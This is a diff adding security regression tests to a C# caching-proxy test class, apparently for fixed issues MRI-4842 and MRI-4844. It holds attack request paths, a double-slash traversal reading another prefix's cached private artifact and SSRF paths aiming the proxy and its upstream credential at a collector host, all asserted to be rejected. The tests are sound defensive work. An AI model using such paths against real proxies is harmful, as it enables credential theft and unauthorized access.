@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.IdentityModel.Tokens.Jwt;
 using System.IO;
@@ -35,6 +36,13 @@ public class InboundAuthTest : IAsyncLifetime
   private const string ClientId = "svc-proxy";
   private const string ClientSecret = "s3cr3t";
   private const string AccessToken = "issued-access-token";
+  private const string PrivateArtifact = "private-artifact-body";
+
+  // What client-credentials mode puts on the wire: the client id as the Basic username and the issued
+  // access token as the password (see UpstreamAuthorizationProvider). The private upstream route below
+  // demands it, so an anonymous reader that ever sees PrivateArtifact got it from our cache, not upstream.
+  private static readonly string ourUpstreamCredential =
+    "Basic " + Convert.ToBase64String(Encoding.UTF8.GetBytes($"{ClientId}:{AccessToken}"));
 
   private const string Issuer = "https://issuer.example.com";
   private const string Audience = "artifacts-caching-proxy";
@@ -47,6 +55,13 @@ public class InboundAuthTest : IAsyncLifetime
   // the token endpoint (outbound upstream auth), as a real provider like JetBrains hub does.
   private readonly WebApplication myAuthServer;
   private readonly WebApplication myUpstreamServer;
+
+  // Exists only to prove it is never contacted: the "other host" a remainder carrying an authority of its
+  // own would aim the request - and a gated prefix's credential - at (MRI-4844). It answers everything, so
+  // a regression cannot be mistaken for an unreachable host.
+  private readonly WebApplication myCollectorServer;
+  private readonly ConcurrentQueue<string> myCollectedRequests = new();
+
   private string myTempDirectory = "";
   private IHost? myProxyHost;
 
@@ -71,8 +86,26 @@ public class InboundAuthTest : IAsyncLifetime
       });
     });
 
-    myUpstreamServer = BuildKestrel(router => router.MapGet("{*path}", (_, res, _) =>
-      res.WriteAsync("artifact-body")));
+    myUpstreamServer = BuildKestrel(router => router
+      // Registered before the catch-all every other test uses, so only this one path is credential-gated -
+      // a real private repository serves nothing without the account.
+      .MapGet("secure/private.jar", (req, res, _) =>
+      {
+        if (req.Headers.Authorization.ToString() != ourUpstreamCredential)
+        {
+          res.StatusCode = StatusCodes.Status401Unauthorized;
+          return res.WriteAsync("upstream-unauthorized");
+        }
+
+        return res.WriteAsync(PrivateArtifact);
+      })
+      .MapGet("{*path}", (_, res, _) => res.WriteAsync("artifact-body")));
+
+    myCollectorServer = BuildKestrel(router => router.MapGet("{*path}", (req, res, _) =>
+    {
+      myCollectedRequests.Enqueue($"{req.Path} {req.Headers.Authorization}");
+      return res.WriteAsync("collected");
+    }));
   }
 
   [Fact]
@@ -212,6 +245,62 @@ public class InboundAuthTest : IAsyncLifetime
     {
       await host.StopAsync();
     }
+  }
+
+  [Fact]
+  public async Task A_Public_Prefix_Cannot_Read_A_Private_Prefixs_Cache()
+  {
+    // MRI-4842. /public and /private sit on one host, differing only in their configured subpath, and the
+    // cache key follows the resolved upstream while the gate follows the prefix. So "/public//secure/..."
+    // - whose "/secure/..." remainder replaces /public's base path - used to hit the entry /private had
+    // filled and serve a private artifact to a caller with no token at all.
+    using var authorized = myProxyHost!.GetTestServer().CreateClient();
+    authorized.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", MintToken());
+
+    var warm = await authorized.GetAsync("/private/private.jar");
+    Assert.Equal(HttpStatusCode.OK, warm.StatusCode);
+    Assert.Equal(PrivateArtifact, await warm.Content.ReadAsStringAsync());
+
+    // The artifact is now cached, so the attack below has something to read - without this the test could
+    // pass on an empty cache and prove nothing.
+    var cached = await authorized.GetAsync("/private/private.jar");
+    Assert.Equal(CachingProxyStatus.HIT.ToString(),
+      cached.Headers.GetValues(CachingProxyConstants.StatusHeader).Single());
+
+    using var anonymous = myProxyHost!.GetTestServer().CreateClient();
+
+    var attack = await anonymous.GetAsync("/public//secure/private.jar");
+
+    Assert.Equal(HttpStatusCode.BadRequest, attack.StatusCode);
+    Assert.DoesNotContain(PrivateArtifact, await attack.Content.ReadAsStringAsync());
+  }
+
+  [Fact]
+  public async Task A_Gated_Prefix_Cannot_Be_Aimed_At_Another_Host()
+  {
+    // MRI-4844. A remainder starting with "//" replaces the authority, so the request - and with it the
+    // credential /private is configured to send - went to a host the caller named. The valid token here only
+    // gets past [Authorize]; it is the proxy's own upstream account that would have leaked.
+    using var client = myProxyHost!.GetTestServer().CreateClient();
+    client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", MintToken());
+
+    var response = await client.GetAsync($"/private///{UrlOf(myCollectorServer).Authority}/steal");
+
+    Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
+    Assert.Empty(myCollectedRequests);
+  }
+
+  [Fact]
+  public async Task A_Public_Prefix_Cannot_Be_Aimed_At_Another_Host()
+  {
+    // The same SSRF with no credential to leak and no token to present: an unauthenticated caller must not
+    // be able to make the proxy fetch (and cache) a URL of their choosing.
+    using var client = myProxyHost!.GetTestServer().CreateClient();
+
+    var response = await client.GetAsync($"/public///{UrlOf(myCollectorServer).Authority}/steal");
+
+    Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
+    Assert.Empty(myCollectedRequests);
   }
 
   [Fact]
@@ -417,6 +506,7 @@ public class InboundAuthTest : IAsyncLifetime
 
     await myAuthServer.StartAsync();
     await myUpstreamServer.StartAsync();
+    await myCollectorServer.StartAsync();
 
     myProxyHost = BuildProxyHost(BuildConfig());
     await myProxyHost.StartAsync();
@@ -500,6 +590,7 @@ public class InboundAuthTest : IAsyncLifetime
   {
     if (myProxyHost != null) await myProxyHost.StopAsync();
     myProxyHost?.Dispose();
+    await myCollectorServer.StopAsync();
     await myUpstreamServer.StopAsync();
     await myAuthServer.StopAsync();
     myRsa.Dispose();
